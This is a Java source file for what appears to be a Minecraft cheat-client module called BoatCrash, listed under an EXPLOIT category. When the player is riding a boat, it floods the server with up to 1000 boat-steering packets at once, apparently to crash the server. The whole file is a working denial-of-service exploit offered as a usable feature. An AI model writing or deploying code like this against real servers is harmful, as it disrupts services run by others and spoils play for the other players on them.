package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.Module;
import cc.candy.candymod.setting.Setting;
import net.minecraft.entity.Entity;
import net.minecraft.entity.item.EntityBoat;
import net.minecraft.network.play.client.CPacketSteerBoat;
import net.minecraft.network.play.client.CPacketVehicleMove;

public class BoatCrash extends Module {
    public Setting<Integer> amount = register(new Setting("Amount" ,100 , 1000 , 1));

    public BoatCrash() {
        super("BoatCrash", Categories.EXPLOIT, false, false);
    }

    @Override
    public void onEnable() {
        if (nullCheck()) return;
        Entity e = mc.player.getRidingEntity();
        if (!(e instanceof EntityBoat)) {
            sendMessage("You are not riding boat! disabling");
            disable();
            return;
        }
        for (int i = 0; i < amount.getValue(); i++) {
            mc.player.connection.sendPacket(new CPacketSteerBoat(true , true));
        }
    }
}
